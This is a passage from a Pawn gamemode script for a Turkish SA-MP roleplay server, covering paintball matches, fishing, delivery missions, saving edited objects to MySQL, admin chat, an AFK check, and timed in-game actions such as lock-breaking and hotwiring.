				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: M4");
				        PBGunID = 31;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,24,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: Deagle");
				        PBGunID = 24;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
			else if(Mp5Vote == M4Vote)
			{
				new __random=random(2);
				ResetPlayerWeapons(i);
				switch(__random)
				{
				    case 0:
				    {
				        GivePlayerWeapon(i,31,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: M4");
				        PBGunID = 31;
				    }
				    case 1:
				    {
				        GivePlayerWeapon(i,29,99999);
				        SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý baþladý. Kullanabileceðiniz silah: MP5");
				        PBGunID = 29;
					}
				}
				SendClientMessage(i,COLOR_LIGHTRED,"{E84D4D}[Paintball]{FFFFFF} Maç süresi toplam 5 dakikadýr, iyi eðlenceler.");
				SetTimer("PaintBallEnd",300000,false);
			}
		}
	}
	return 1;
}
forward DestroyCampfire(playerid);
public DestroyCampfire(playerid)
{
	DestroyObjectCampfire(campnumber[playerid]);
	isOn[playerid] = 0;
	Bilgi(playerid, "En son yakmýþ olduðunuz ateþ söndü.");
	return 1;
}
forward PaintBallEnd();
public PaintBallEnd()
{
	new string[128],string2[128];

	PBStarted = false;
	DeagleVote = 0;
	M4Vote = 0;
	Mp5Vote = 0;
	ShotgunVote = 0;
	SnipeVote = 0;

	foreach(new i : Player)
	{
	    if(Girdi[i])
	    {
			if(PlayerPBing[i])
			{
			    DONDUR(i);
				SetPlayerPos(i,776.3368,-1036.1980,24.2733);
				SetPlayerVirtualWorld(i, 0);
				SetPlayerInterior(i, 0);
				SetPlayerSkin(i, Karakter[i][skin]);
				ResetPlayerWeapons(i);
				SendClientMessage(i,COLOR_YELLOW,"{E84D4D}[Paintball]{FFFFFF} Paintball maçý sonlandýrýldý.");
				format(string, sizeof(string), "{E84D4D}[Paintball]{FFFFFF} Paintball maçýný %s(ID:%d) kazandý! Toplam %d oyuncuyu öldürdü!", OyuncuAdiniBul(PBLeaderid), PBLeaderid, PBLeaderKills);
				format(string2,sizeof(string2),"{E84D4D}[Paintball]{FFFFFF} Bu maçta yer alan toplam oyuncu sayýsý: %d",PBPlayers);
				SendClientMessage(i,COLOR_WHITE,string);
				SendClientMessage(i,COLOR_LIGHTBLUE,string2);
				SetPlayerTeam(i, NO_TEAM);
				SetPlayerHealth(i, pHP[i]);
				SetPlayerArmour(i, pARMO[i]);
				PlayerPBKills[i] = 0;
				PlayerPBing[i] = false;
				COZ(i);
			}
		}
	}
	PBPlayers = 0;
	PBLeaderid = 999;
	PBLeaderKills = 0;
	PBGunID = 0;
	return 1;
}
forward BalikVuruyor(playerid);
public BalikVuruyor(playerid)
{
	BalikVuruyorVar[playerid] = 1;
	Bilgi(playerid, "Oltanýza bir balýk vuruyor.");
	SetTimerEx("BalikCekFailed", 3000, 0, "i", playerid);
	PlayerPlaySound(playerid, 1056, 0, 0, 0);
}

forward BalikCekFailed(playerid);
public BalikCekFailed(playerid)
{
	if(!BalikCekiyor[playerid])
	{
		KillTimerEx(balikvuruyortimer[playerid]);
		Bilgi(playerid, "Yeminizi kaybettiniz.");
		TogglePlayerControllable(playerid, 1);
		BalikTutuyor[playerid] = 0;
		BalikVuruyorVar[playerid] = 0;
  		ApplyAnimationEx(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
  		RemovePlayerAttachedObject(playerid, 9);
	}
}
forward BalikCek(playerid);
public BalikCek(playerid)
{
	//printf("YEM:%d",Karakter[playerid][yem]);
	if(Karakter[playerid][yem] == 1)
	{
		//print("80");
	    new randombaliktut = random(5);
		switch(randombaliktut)
		{
			case 0: Bilgi(playerid, "Balýk tutamadýnýz."),
					TogglePlayerControllable(playerid, 1);
			case 1: Bilgi(playerid, "Balýk tuttunuz."),
	  				TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
			case 2: Bilgi(playerid, "Balýk tuttunuz."),
					TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
			case 3: Bilgi(playerid, "Balýk tuttunuz."),
	  				TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
			case 4: Bilgi(playerid, "Balýk tuttunuz."),
	  				TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
		}
	 	//Bilgi(playerid, "Balýk tuttunuz."),
		//TogglePlayerControllable(playerid, 1),
		//Karakter[playerid][balik]++;
  		ApplyAnimationEx(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
    	RemovePlayerAttachedObject(playerid, 9);
	}
	if(Karakter[playerid][yem] == 2)
	{
	    //print("60");
		new randombaliktut = random(5);
		switch(randombaliktut)
		{
			case 0: Bilgi(playerid, "Balýk tutamadýnýz."),
					TogglePlayerControllable(playerid, 1);
			case 1: Bilgi(playerid, "Balýk tutamadýnýz."),
					TogglePlayerControllable(playerid, 1);
			case 2: Bilgi(playerid, "Balýk tuttunuz."),
					TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
			case 3: Bilgi(playerid, "Balýk tuttunuz."),
	  				TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
			case 4: Bilgi(playerid, "Balýk tuttunuz."),
	  				TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
		}
  		ApplyAnimationEx(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
    	RemovePlayerAttachedObject(playerid, 9);
	}
	if(Karakter[playerid][yem] == 3)
	{
	    //print("50");
		new randombaliktut = random(3);
		switch(randombaliktut)
		{
		    case 0 .. 1: Bilgi(playerid, "Balýk tutamadýnýz."),
   					TogglePlayerControllable(playerid, 1);
			case 2: Bilgi(playerid, "Balýk tuttunuz."),
					TogglePlayerControllable(playerid, 1),
					Karakter[playerid][balik]++;
		}
  		ApplyAnimationEx(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
    	RemovePlayerAttachedObject(playerid, 9);
	}
}
forward IsFishingPos(playerid);
public IsFishingPos(playerid)
{
    if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid, 45.0, 380.9995,-2154.0984,-0.6328) || IsPlayerInRangeOfPoint(playerid, 45.0, 47.3103,-1981.4442,-0.5948))
	    {
	        new Float:xxx,Float:yyy,Float:zzz;
	        GetPlayerPos(playerid, xxx, yyy, zzz);
			#pragma unused xxx
			#pragma unused yyy
	        if(IsPlayerSwimming(playerid) && zzz > 0)
	        {
	            Hata(playerid, "Balýk tutmak için teknenin üzerinde olmanýz gerekmektedir.");
	            return 0;
	        }
	        return 1;
	    }
		if(IsPlayerInRangeOfPoint(playerid, 5.0, 403.9279,-2088.7839,7.8359) || PlayerToPoint(5.0,playerid,398.7656,-2088.7866,7.8359))
		{
		    return 1;
		}
		else if(PlayerToPoint(5.0,playerid,396.2937,-2088.7964,7.8359) || PlayerToPoint(5.0,playerid,391.0406,-2088.7964,7.8359))
		{
		    return 1;
		}
		else if(PlayerToPoint(5.0,playerid,383.4574,-2088.7878,7.8359) || PlayerToPoint(5.0,playerid,374.9459,-2088.7537,7.8359))
		{
		    return 1;
		}
		else if(PlayerToPoint(5.0,playerid,369.7326,-2088.7795,7.8359) || PlayerToPoint(5.0,playerid,367.2545,-2088.7844,7.8359))
		{
		    return 1;
		}
		else if(PlayerToPoint(5.0,playerid,362.2045,-2088.7952,7.8359) || PlayerToPoint(5.0,playerid,354.4106,-2088.7917,7.8359))
		{
		    return 1;
		}
		else if(PlayerToPoint(5.0,playerid,349.9595,-2072.6577,7.8359) || PlayerToPoint(5.0,playerid,349.9364,-2067.6616,7.8359))
		{
		    return 1;
		}//
		else if(PlayerToPoint(5.0,playerid,349.9323,-2064.9492,7.8359) || PlayerToPoint(5.0,playerid,349.8962,-2059.4092,7.8359))
		{
		    return 1;
		}
		else if(PlayerToPoint(5.0,playerid,349.9102,-2051.7944,7.8359))
		{
		    return 1;
		}
	}
	return 0;
}
forward SevkiyatIkinciTimer(playerid);
public SevkiyatIkinciTimer(playerid)
{
	SetPlayerCheckpoint(playerid, 81.8434,-261.1215,1.6719, 7.5);
	SevkiyatCheckpoint[playerid] = 51;
	Bilgi(playerid, "Yükünüzü býraktýnýz. Görevi tamamlamak için belirlenen alana geri dönün.");
	TogglePlayerControllable(playerid, 1);
//	SetVehicleZAngle(GetPlayerVehicleID(playerid), 69.8982);
}
forward SevkiyatBaslangicTimer(playerid);
public SevkiyatBaslangicTimer(playerid)
{
	SetPlayerCheckpoint(playerid, 2805.9268,-1543.9690,11.0182, 7.5);
	SevkiyatCheckpoint[playerid] = 15;
	Bilgi(playerid, "Kamyon yüklendi. Checkpointleri takip ederek yükünüzü nakliye alanýna götürmelisiniz.");
	TogglePlayerControllable(playerid, 1);
}
forward IsVehicleOccupied(vehicleid);
public IsVehicleOccupied(vehicleid)
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerInVehicle(i,vehicleid))
		return 1;
	}
	return 0;
}
forward TimerFall(playerid);
public TimerFall(playerid) { ApplyAnimationEx(playerid,"KNIFE","knife_hit_3",4.1,0,1,1,0,0); TogglePlayerControllable(playerid, 1); }
public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	if(Debug) printf("OnPlayerEditDynamicObject(%d, %d, %d, %f, %f, %f, %f, %f, %f)",playerid, objectid, response, x, y, z, rx, ry, rz);
	if(response == 1 || response == 0)
	{
	    if(GetPVarInt(playerid, "atmobje"))
	    {
	        new deger = GetPVarInt(playerid, "atmidmiz");
	        new query[256];
	        ATM[deger][atmx] = x;
	        ATM[deger][atmy] = y;
	        ATM[deger][atmz] = z;
	        ATM[deger][atmrx] = rx;
	        ATM[deger][atmry] = ry;
	        ATM[deger][atmrz] = rz;
	        ATM[deger][atmint] = GetPlayerInterior(playerid);
	        ATM[deger][atmvw] = GetPlayerVirtualWorld(playerid);
	        SetDynamicObjectPos(ATM[deger][atmobje],x,y,z);
	        SetDynamicObjectRot(ATM[deger][atmobje],rx,ry,rz);
	        ATMKaydet(deger);
	        format(query, sizeof(query), "UPDATE `atm` SET `x` = '%f', `y` = '%f', `z` = '%f', `rx` = '%f', `ry` = '%f', `rz` = '%f', `interior` = '%d', `vworld` = '%d' WHERE `id` = '%d'",
			x,y,z,rx,ry,rz,ATM[deger][atmint],ATM[deger][atmvw],ATM[deger][atmid]);
			mysql_tquery(1,query);
			//print(query);
   			DeletePVar(playerid, "atmidmiz");
	        DeletePVar(playerid, "atmobje");
	        Bilgi(playerid, "ATM baþarýyla kayýt edildi.");
		}
		if(GetPVarInt(playerid, "BarikatDuzenliyorum"))
		{
		    new barikatid = GetPVarInt(playerid, "DuzenleBarikat");
		    new pName[25];
		    GetPlayerName(playerid, pName, 25);
		    SetDynamicObjectPos(objectid, x, y, z);
			SetDynamicObjectRot(objectid, rx, ry, rz);
	        Barikat[barikatid][bx] = x;
			Barikat[barikatid][by] = y;
			Barikat[barikatid][bz] = z;
			Barikat[barikatid][brx] = rx;
			Barikat[barikatid][bry] = ry;
			Barikat[barikatid][brz] = rz;
			Barikat[barikatid][d_id] = Karakter[playerid][sqlid];
	        format(Barikat[barikatid][DuzenleyenIsim], 25, pName);
	        new query[256];
	        format(query, 256, "UPDATE `barikatlar` SET `d_id`= '%d',`x`='%f',`y`='%f',`z`='%f',`rx`='%f',`ry`='%f',`rz`='%f' WHERE `buniqueid` = '%d'",
	        Barikat[barikatid][d_id],x,y,z,rx,ry,rz,Barikat[barikatid][buniqueid]);
	        mysql_tquery(1,query);
		}
  		if(GetPVarInt(playerid, "CCTV_Duzenliyor"))
		{
		    new _c_id = GetPVarInt(playerid, "DuzenleCCTV");
		    SetDynamicObjectPos(objectid, x, y, z);
			SetDynamicObjectRot(objectid, rx, ry, rz);
	        CCTV[_c_id][c_px] = x;
			CCTV[_c_id][c_py] = y;
			CCTV[_c_id][c_pz] = z;
			CCTV[_c_id][c_rx] = rx;
			CCTV[_c_id][c_ry] = ry;
			CCTV[_c_id][c_rz] = rz;
	        CCTVKaydet(_c_id);
	        DeletePVar(playerid, "CCTV_Duzenliyor");
	        DeletePVar(playerid, "DuzenleCCTV");
	        Bilgi(playerid, "CCTV'i düzenlediniz.");
		}
		if(GetPVarInt(playerid, "AnkesorluTelefonDuzenliyor"))
		{
  			if(response == EDIT_RESPONSE_FINAL)
		    {
			    new _a_id = GetPVarInt(playerid, "DuzenleAnkesorluTelefon");
			    SetDynamicObjectPos(objectid, x, y, z);
				SetDynamicObjectRot(objectid, rx, ry, rz);
		        ATelefon[_a_id][a_x] = x;
				ATelefon[_a_id][a_y] = y;
				ATelefon[_a_id][a_z] = z;
				ATelefon[_a_id][a_rx] = rx;
				ATelefon[_a_id][a_ry] = ry;
				ATelefon[_a_id][a_rz] = rz;
				new Float:oPos[3];
				GetXYInBehindOfObject(objectid, oPos[0], oPos[1], oPos[2], 0.3);
				if(IsValidDynamic3DTextLabel(ATelefon[_a_id][a_textlabel])) DestroyDynamic3DTextLabel(ATelefon[_a_id][a_textlabel]);
				ATelefon[_a_id][a_textlabel] = CreateDynamic3DTextLabel("{f9f9f9} "C3"''/atelefon''", 0xAFAFAFFF, oPos[0], oPos[1], oPos[2]+0.5, 7.5, .testlos=1, .worldid=0);
		        AnkesorluTelefonKaydet(_a_id);
		        DeletePVar(playerid, "AnkesorluTelefonDuzenliyor");
		        DeletePVar(playerid, "DuzenleAnkesorluTelefon");
		        Bilgi(playerid, "Ankesörlü telefon düzenlediniz.");
			}
		}
		if(GetPVarType(playerid, "SilahiniDuzenliyor") > 0)
		{
		    if(response == EDIT_RESPONSE_FINAL)
		    {
		        SilahYer[Karakter[playerid][sysobjectd]][syposx] = x;
		        SilahYer[Karakter[playerid][sysobjectd]][syposy] = y;
		        SilahYer[Karakter[playerid][sysobjectd]][syposz] = z;
		        SilahYer[Karakter[playerid][sysobjectd]][syposrx] = rx;
		        SilahYer[Karakter[playerid][sysobjectd]][syposry] = ry;
		        SilahYer[Karakter[playerid][sysobjectd]][syposrz] = rz;
		        SilahYer[Karakter[playerid][sysobjectd]][syvworld] = GetPlayerVirtualWorld(playerid);
		        SilahYer[Karakter[playerid][sysobjectd]][syinterior] = GetPlayerInterior(playerid);
				SetDynamicObjectPos(SilahYer[Karakter[playerid][sysobjectd]][syobject], x, y, z);
				SetDynamicObjectRot(SilahYer[Karakter[playerid][sysobjectd]][syobject], rx, ry, rz);
				DeletePVar(playerid, "SilahiniDuzenliyor");
				new query[512];
			    format(query, sizeof(query), "UPDATE `silahyer` SET `syposx` = '%f', `syposy` = '%f', `syposz` = '%f', `syvworld` = '%d', `syinterior` = '%d', `sysilah` = '%d', `symermi` = '%d', `posrx` = '%f', `posry` = '%f', `posrz` = '%f' WHERE `id` = '%d'",
			    SilahYer[Karakter[playerid][sysobjectd]][syposx],
			    SilahYer[Karakter[playerid][sysobjectd]][syposy],
			    SilahYer[Karakter[playerid][sysobjectd]][syposz],
			    SilahYer[Karakter[playerid][sysobjectd]][syvworld],
			    SilahYer[Karakter[playerid][sysobjectd]][syinterior],
			    SilahYer[Karakter[playerid][sysobjectd]][sysilah],
			    SilahYer[Karakter[playerid][sysobjectd]][symermi],
			    SilahYer[Karakter[playerid][sysobjectd]][syposrx],
			    SilahYer[Karakter[playerid][sysobjectd]][syposry],
			    SilahYer[Karakter[playerid][sysobjectd]][syposrz],
			    SilahYer[Karakter[playerid][sysobjectd]][syid]);
			    mysql_tquery(1,query);
				Bilgi(playerid, "Baþarýlý bir þekilde elinizdeki silahý yere býraktýnýz.");
				Bilgi(playerid, "Herhangi bir kayýp ile karþýlaþtýðýnýzda destek paneli üzerinden bize ulaþýnýz.");
				Bilgi(playerid, "Silahýnýzýn modeli ve bulunduðunuz konum log panelimize kayýt edildi.");
		    }
		}
		if(mobilyaci4[playerid] == 1)
		{
		    new mid2 = mobilyaci3[playerid];
		    SetDynamicObjectPos(objectid, x, y, z);
		    SetDynamicObjectRot(objectid, rx, ry, rz);
		    Streamer_Update(playerid);
			new query[512];
			mobilyaci4[playerid] = 0;
			Mobilya[mid2][mx] = x;
			Mobilya[mid2][my] = y;
			Mobilya[mid2][mz] = z;
			Mobilya[mid2][mrx] = rx;
			Mobilya[mid2][mry] = ry;
			Mobilya[mid2][mrz] = rz;
			format(query , sizeof(query), "UPDATE `mobilya` SET `x` = '%f', `y` = '%f', `z` = '%f', `rx` = '%f', `ry` = '%f', `rz` = '%f' WHERE `id` = '%d'",
			x,y,z,rx,ry,rz,Mobilya[mid2][mid]);
			mysql_tquery(1,query);
			if(mobilyaci5[playerid] == 1)
			{
			    DeletePlayer3DTextLabel(playerid, Mobilya[mid2][mlabel]);
				new mstring[64];
	   			format(mstring, sizeof(mstring), "{FFFFFF}Mobilya[{fb5a02}%d{FFFFFF}]",mid2);
			    Mobilya[mid2][mlabel] = CreatePlayer3DTextLabel(playerid,mstring,0x008080FF,Mobilya[mid2][mx],Mobilya[mid2][my],Mobilya[mid2][mz],3.0);
			}
			Bilgi(playerid, "Mobilyanýz kaydedildi.");
			MobilyaKaydet(mid2);
		}
		if(objeduzenle[playerid] == 1)
		{
  			new id;
		    for(new i;i<MAX_OBJE;i++)
		    {
		        if(Obje[i][oobje] == objectid)
		        {
					id = i;
					break;
		        }
		    }
		    Obje[id][ox] = x;
		    Obje[id][oy] = y;
		    Obje[id][oz] = z;
			Obje[id][orx] = rx;
			Obje[id][ory] = ry;
			Obje[id][orz] = rz;
		    Bilgi(playerid, "Objenin pozisyonunu düzenlediniz.");
		    SetDynamicObjectPos(objectid, x, y, z);
		    SetDynamicObjectRot(objectid, rx, ry, rz);
		    Streamer_Update(playerid);
			ObjeKaydet(id);
		    objeduzenle[playerid] = 0;
		    if(objegoruyor[playerid] == 1)
			{
			    DeletePlayer3DTextLabel(playerid, Obje[id][glabel]);
				new mstring[64];
	   			format(mstring, sizeof(mstring), "{FFFFFF}Obje[{fb5a02}%d{FFFFFF}]",Obje[id][oid]);
			    Obje[id][glabel] = CreatePlayer3DTextLabel(playerid,mstring,0x008080FF,Obje[id][ox],Obje[id][oy],Obje[id][oz]+1.3,5.0);
			}
		}
		if(gateduzen[playerid] > 0)
		{
		    new id=gateduzenle[playerid];
		    if(gateduzen[playerid] == 1)
		    {
		        Gate[id][gx] = x;
		        Gate[id][gy] = y;
		        Gate[id][gz] = z;
				Gate[id][grx] = rx;
				Gate[id][gry] = ry;
				Gate[id][grz] = rz;
		        Bilgi(playerid, "Gate'in kapalý pozisyonunu düzenlediniz.");
		        SetDynamicObjectPos(objectid, x, y, z);
		    	SetDynamicObjectRot(objectid, rx, ry, rz);
		    	Streamer_Update(playerid);
				GateKaydet(id);
		    }
		    else if(gateduzen[playerid] == 2)
		    {
		        Gate[id][gox] = x;
		        Gate[id][goy] = y;
		        Gate[id][goz] = z;
				Gate[id][gorx] = rx;
				Gate[id][gory] = ry;
				Gate[id][gorz] = rz;
		        Bilgi(playerid, "Gate'in açýk pozisyonunu düzenlediniz.");
		    	GateKaydet(id);
		    }
		    gateduzen[playerid] = 0;
		    if(gategoruyor[playerid] == 1)
			{
			    DeletePlayer3DTextLabel(playerid, Gate[id][glabel]);
				new mstring[64];
	   			format(mstring, sizeof(mstring), "{FFFFFF}Gate[{fb5a02}%d{FFFFFF}]",Gate[id][gid]);
			    Gate[id][glabel] = CreatePlayer3DTextLabel(playerid,mstring,0x008080FF,Gate[id][gx],Gate[id][gy],Gate[id][gz]+1,5.0);
			}
		}
		if(Karakter[playerid][gDuzenliyor] == 1)
		{
			Objebitti(playerid, objectid, response, x, y, z, rx, ry, rz);
		}
		if(GetPVarInt(playerid, "GraffitiDuzenle") == 1)
		{
		    SetPVarInt(playerid, "GraffitiDuzenle", 0);
		    if(response)
		    {
		        SetPVarFloat(playerid, "gPosx", x);
		        SetPVarFloat(playerid, "gPosy", y);
		        SetPVarFloat(playerid, "gPosz", z);
		        SetPVarFloat(playerid, "gRotx", rx);
		        SetPVarFloat(playerid, "gRoty", ry);
		        SetPVarFloat(playerid, "gRotz", rz);
		    }
		}
	}
	return 1;
}
forward TaserBitti(playerid);
public TaserBitti(playerid)
{
	ClearAnimations(playerid);
	TogglePlayerControllable(playerid, 1);
}

forward EkibeYolla(color, const string[], levo);
public EkibeYolla(color,const string[],levo)
{
	printf("[ADMIN CHAT] %s",string);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if (Karakter[i][adminlevel] >= levo && AdminDuyma[i] == 1 && Girdi[i])
			{
				SendClientMessage(i, color, string);
			}
		}
	}
	return 1;
}

forward EkibeYollaDuty(color, const string[], levo);
public EkibeYollaDuty(color,const string[],levo)
{
	printf("[ADMIN CHAT] %s",string);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if (Karakter[i][adminlevel] >= levo && AdminDuyma[i] == 1 && Girdi[i] && aDuty[i])
			{
				SendClientMessage(i, color, string);
			}
		}
	}
	return 1;
}

forward EkibeYollaEx(color, const string[]);
public EkibeYollaEx(color,const string[])
{
	printf("[ADMIN CHAT] %s",string);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if (Karakter[i][adminlevel] > 0  || Karakter[i][tester] > 0)
			{
				SendClientMessage(i, color, string);
			}
		}
	}
	return 1;
}

forward CozEvladim(playerid);
public CozEvladim(playerid) TogglePlayerControllable(playerid, 1);
forward Float:GetDistanceBetweenPoints(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2);
public Float:GetDistanceBetweenPoints(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2) return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));

forward Float:VehiclePlayerDistance(playerid,veh);
public Float:VehiclePlayerDistance(playerid,veh)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:x1,Float:y1,Float:z1;
		GetPlayerPos(playerid,x1,y1,z1);
		new Float:x2,Float:y2,Float:z2;
		GetVehiclePos(veh,x2,y2,z2);
		return GetDistanceBetweenPoints(x2,y2,z2,x1,y1,z1);
	}
	return -1.0;
}

forward UpdateNameTag();
public UpdateNameTag()
{
	for(new i; i < MAX_PLAYERS; i++)
	{
	    new string[128];
	    new Float:playerHP, Float:playerArmor;
	    GetPlayerHealth(i, playerHP);
		GetPlayerArmour(i, playerArmor);
		if(playerArmor > 0) {
			format(string, sizeof(string), "{FFFFFF}%s\n{FF0000}%s", GetArmorDots(i), GetHealthDots(i));
		} else {
			format(string, sizeof(string), "{FF0000}%s", GetHealthDots(i));
		}
	    UpdateDynamic3DTextLabelText(tanismaHP[i], -1, string);
	}
}

GetPlayerSpeedTest(playerid)
{
	new Float:SPD, Float:vx, Float:vy, Float:vz;
	GetVehicleVelocity(GetPlayerVehicleID(playerid), vx,vy,vz);
	SPD = (floatsqroot(((vx*vx)+(vy*vy))+(vz*vz))*100);
	return floatround(SPD);
}

CancelDrivingTest(playerid)
{
	if (ehliyettesti[playerid] == 1)
	{
 		SetPlayerPos(playerid, Veriler[ehliyetX], Veriler[ehliyetY], Veriler[ehliyetZ]);

  		SetPlayerInteriorEx(playerid, 0);
  		SetPlayerVirtualWorld(playerid, 0);

		DisablePlayerCheckpoint(playerid);
  		SetCameraBehindPlayer(playerid);

		MotoruKapat(ehliyetaraci[playerid]);
		Aractamiri(ehliyetaraci[playerid]);
  		SetVehicleToRespawn(ehliyetaraci[playerid]);
  		ehliyettesti[playerid] = 0;
  		ehliyetaraci[playerid] = 0;
	}
	return 1;
}

forward Saniyebasi();
public Saniyebasi()
{
	if(Debug) printf("Saniyebasi()");
    new string[128];
	foreach(new i : Player)
	{
	    if(Girdi[i])
	    {
	        if(Karakter[i][adminlevel] < 5 && !Karakter[i][bot] && gantiafk && Karakter[i][ajail] == 0 && Karakter[i][kodes] == 0)
			{
				if(IsPlayerInRangeOfPoint(i,0,gAFKX[i],gAFKY[i],gAFKZ[i])) { gAFKTIMER[i]++; }
				else { gAFKTIMER[i] = 0; GetPlayerPos(i, gAFKX[i],gAFKY[i],gAFKZ[i]); }
			}
	        else if(gAFKTIMER[i] == 1080 && gantiafk)
	        {
				format(gAFKRANDOM[i], 7, "%s", RandomLimit(6));
				format(string, sizeof(string), ""C1"AFK kontrolü, lütfen kodu aþaðýya yazýn:\n"C2"%s",gAFKRANDOM[i]);
				ShowPlayerDialog(i, 357, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"AFK Kontrol", string, "Kodu Gir", "");
			}
			else if(gAFKTIMER[i] == 1200 && gantiafk)
			{
			    Bilgi(i, "AFK kontrolünü geçemediðiniz için sunucudan atýldýnýz.");
			    KickEx(i);
			}
		}
		if(GetPVarInt(i, "EsyaTasiyor") > 0)
		{
		    SetPVarInt(i, "EsyaTasiyor", GetPVarInt(i, "EsyaTasiyor")-1);
		    new mstring[4];
		    format(mstring, sizeof(mstring), "%d", GetPVarInt(i, "EsyaTasiyor"));
		    PlayerTextDrawSetString(i, GeriSayimTD[i], mstring);
		    if(GetPVarInt(i, "EsyaTasiyor") == 0)
		    {
		        COZ(i);
		        ClearAnimations(i);
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
                SetPlayerSpecialAction(i, SPECIAL_ACTION_CARRY);
                DestroyDynamicObject(Mobilya[GetPVarInt(i, "EsyaTasiID")][mobje]);
                SetPlayerAttachedObject(i,9,-2000,1,0.183000,0.567000,-0.020999,0.000000,0.000000,0.000000,0.422000,0.412000,0.408000);
                SetPVarInt(i, "EsyaTasiModel", Mobilya[GetPVarInt(i, "EsyaTasiID")][mmodel]);
		    }
		}
		if(GetPVarInt(i, "AracParcaliyor") > 0)
		{
		    SetPVarInt(i, "AracParcaliyor", GetPVarInt(i, "AracParcaliyor")-1);
		    new mstring[4];
		    format(mstring, sizeof(mstring), "%d", GetPVarInt(i, "AracParcaliyor"));
		    PlayerTextDrawSetString(i, GeriSayimTD[i], mstring);
		    if(GetPVarInt(i, "AracParcaliyor") == 0)
		    {
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
		        AracParcala(GetPlayerVehicleID(i));
		        GivePlayerCash(i, floatround(Arac[GetPlayerVehicleID(i)][afiyat]/12));
		        Arac[GetPlayerVehicleID(i)][parcalandi] = 1;
		        Bilgi(i, "Araç parçalandý.");
		        COZ(i);
		    }
		}
		if(GetPVarInt(i, "Yarali") > 0)
		{
		    SetPVarInt(i, "Yarali", GetPVarInt(i, "Yarali")-1);
		    new mstring[4];
		    format(mstring, sizeof(mstring), "%d", GetPVarInt(i, "Yarali"));
		    PlayerTextDrawSetString(i, GeriSayimTD[i], mstring);
		    if(GetPVarInt(i, "Yarali") == 0)
		    {
		        COZ(i);
		        ClearAnimations(i);
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
		        Ipucu(i, "Yerden kalkabilirsiniz.");
		    }
		}
		if(GetPVarInt(i, "DuzKontak") > 0)
		{
		    SetPVarInt(i, "DuzKontak", GetPVarInt(i, "DuzKontak")-1);
		    new mstring[4];
		    format(mstring, sizeof(mstring), "%d", GetPVarInt(i, "DuzKontak"));
		    PlayerTextDrawSetString(i, GeriSayimTD[i], mstring);
		    if(GetPVarInt(i, "DuzKontak") == 0)
		    {
		        COZ(i);
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
		        new vid = GetPlayerVehicleID(i);
		        MotoruAciliyor[vid] = true;
		        MotoruAc(vid, i);
		        Bilgi(i, "Araca düzkontak yaptýnýz.");
		        gAracParcalanabilir[vid] = true;
		    }
		}
		if(GetPVarInt(i, "KilitKir") > 0)
		{
		    SetPVarInt(i, "KilitKir", GetPVarInt(i, "KilitKir")-1);
		    new mstring[4];
		    format(mstring, sizeof(mstring), "%d", GetPVarInt(i, "KilitKir"));
		    PlayerTextDrawSetString(i, GeriSayimTD[i], mstring);
		    if(GetPVarInt(i, "KilitKir") == 0)
		    {
		        new vid = GetNearestVehicle(i);
		        COZ(i);
		        ClearAnimations(i);
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
				KillTimer(AlarmTimer[vid]);
				KilitAc(vid);
				Bilgi(i, "Aracýn kilidini kýrdýnýz.");
		    }
		}
		if(GetPVarInt(i, "KapiKir") > 0)
		{
		    SetPVarInt(i, "KapiKir", GetPVarInt(i, "KapiKir")-1);
		    new mstring[4];
		    format(mstring, sizeof(mstring), "%d", GetPVarInt(i, "KapiKir"));
		    PlayerTextDrawSetString(i, GeriSayimTD[i], mstring);
		    if(GetPVarInt(i, "KapiKir") == 0)
		    {
		        COZ(i);
		        PlayerTextDrawHide(i, GeriSayimTD[i]);
		        switch(GetPVarInt(i, "KapiTip"))
		        {
		            case 1:
		            {
		                Bilgi(i, "Evin kilidini kýrdýnýz.");
		                DoGonder(i, 20.0, "Evin kapýsý kýrýldý.");
		                Ev[GetPVarInt(i, "KapiID")][ekilit] = 0;
		            }
		            case 2:
		            {
		                Bilgi(i, "Ýþyerinin kilidini kýrdýnýz.");
